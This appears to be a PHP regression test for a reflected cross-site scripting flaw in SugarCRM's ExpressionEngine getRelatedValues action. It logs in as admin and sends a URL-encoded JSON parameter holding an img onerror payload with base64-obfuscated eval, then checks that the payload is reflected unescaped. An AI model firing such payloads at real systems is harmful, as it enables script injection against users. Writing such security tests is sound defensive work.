<?php
/*
 * Your installation or use of this SugarCRM file is subject to the applicable
 * terms available at
 * http://support.sugarcrm.com/Resources/Master_Subscription_Agreements/.
 * If you do not agree to all of the applicable terms or do not have the
 * authority to bind the entity as an authorized representative, then do not
 * install or use this SugarCRM file.
 *
 * Copyright (C) SugarCRM Inc. All rights reserved.
 */
declare(strict_types=1);

use Regression\SugarCRMRegression;

class ExpressionGetRelatedValuesRegression extends SugarCRMRegression
{
    /**
     * @return string
     */
    public function getRegressionDescription(): string
    {
        return '[BR-10896] Reflected Cross-Site Scripting through ExpressionEngine module';
    }

    /**
     * @throws \GuzzleHttp\Exception\GuzzleException
     * @throws \Regression\RegressionException
     */
    public function run(): void
    {
        $this->login('admin', 'asdf')
            ->bwcLogin()
            ->get('/index.php?module=ExpressionEngine&action=getRelatedValues&tmodule=Bugs&fields=[{%22link%22%3A%22%3Cimg\u0020src%3Dx\u0020onerror%3Deval(atob(\u0027YWxlcnQoJ1hTUyBvbiAnK2RvY3VtZW50LmRvbWFpbik%3D\u0027))%3E%22%2C%22type%22%3A%22%22}]&bwcFrame=1&bwcRedirect=1')
            ->expectSubstring("\u003Cimg src=x onerror=eval(atob(\u0027YWxlcnQoJ1hTUyBvbiAnK2RvY3VtZW50LmRvbWFpbik=\u0027))\u003E");
    }
}
